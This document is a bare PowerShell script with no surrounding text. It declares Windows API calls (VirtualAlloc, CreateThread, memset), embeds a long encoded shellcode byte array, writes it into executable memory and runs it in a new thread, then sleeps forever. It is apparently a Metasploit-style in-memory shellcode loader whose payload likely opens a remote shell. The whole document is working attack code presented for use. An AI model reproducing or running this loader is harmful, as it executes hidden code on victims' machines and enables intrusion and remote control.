
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x9c,0xe2,0xc7,0x73,0xda,0xd2,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x83,0xc3,0x04,0x31,0x43,0x0f,0x03,0x43,0x93,0x00,0x32,0x8f,0x43,0x46,0xbd,0x70,0x93,0x27,0x37,0x95,0xa2,0x67,0x23,0xdd,0x94,0x57,0x27,0xb3,0x18,0x13,0x65,0x20,0xab,0x51,0xa2,0x47,0x1c,0xdf,0x94,0x66,0x9d,0x4c,0xe4,0xe9,0x1d,0x8f,0x39,0xca,0x1c,0x40,0x4c,0x0b,0x59,0xbd,0xbd,0x59,0x32,0xc9,0x10,0x4e,0x37,0x87,0xa8,0xe5,0x0b,0x09,0xa9,0x1a,0xdb,0x28,0x98,0x8c,0x50,0x73,0x3a,0x2e,0xb5,0x0f,0x73,0x28,0xda,0x2a,0xcd,0xc3,0x28,0xc0,0xcc,0x05,0x61,0x29,0x62,0x68,0x4e,0xd8,0x7a,0xac,0x68,0x03,0x09,0xc4,0x8b,0xbe,0x0a,0x13,0xf6,0x64,0x9e,0x80,0x50,0xee,0x38,0x6d,0x61,0x23,0xde,0xe6,0x6d,0x88,0x94,0xa1,0x71,0x0f,0x78,0xda,0x8d,0x84,0x7f,0x0d,0x04,0xde,0x5b,0x89,0x4d,0x84,0xc2,0x88,0x2b,0x6b,0xfa,0xcb,0x94,0xd4,0x5e,0x87,0x38,0x00,0xd3,0xca,0x54,0xe5,0xde,0xf4,0xa4,0x61,0x68,0x86,0x96,0x2e,0xc2,0x00,0x9a,0xa7,0xcc,0xd7,0xdd,0x9d,0xa9,0x48,0x20,0x1e,0xca,0x41,0xe6,0x4a,0x9a,0xf9,0xcf,0xf2,0x71,0xfa,0xf0,0x26,0xef,0xff,0x66,0x73,0xbe,0x28,0x9b,0xeb,0x3d,0xd7,0x44,0xe3,0xc8,0x31,0xda,0xab,0x9a,0xed,0x9a,0x1b,0x5b,0x5e,0x72,0x76,0x54,0x81,0x62,0x79,0xbe,0xaa,0x08,0x96,0x17,0x82,0xa4,0x0f,0x32,0x58,0x55,0xcf,0xe8,0x24,0x55,0x5b,0x1f,0xd8,0x1b,0xac,0x6a,0xca,0xcb,0x5c,0x21,0xb0,0x5d,0x62,0x9f,0xdf,0x61,0xf6,0x24,0x76,0x36,0x6e,0x27,0xaf,0x70,0x31,0xd8,0x9a,0x0b,0xf8,0x4c,0x65,0x63,0x05,0x81,0x65,0x73,0x53,0xcb,0x65,0x1b,0x03,0xaf,0x35,0x3e,0x4c,0x7a,0x2a,0x93,0xd9,0x85,0x1b,0x40,0x49,0xee,0xa1,0xbf,0xbd,0xb1,0x5a,0xea,0x3f,0x8d,0x8c,0xd2,0x35,0xff,0x0c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
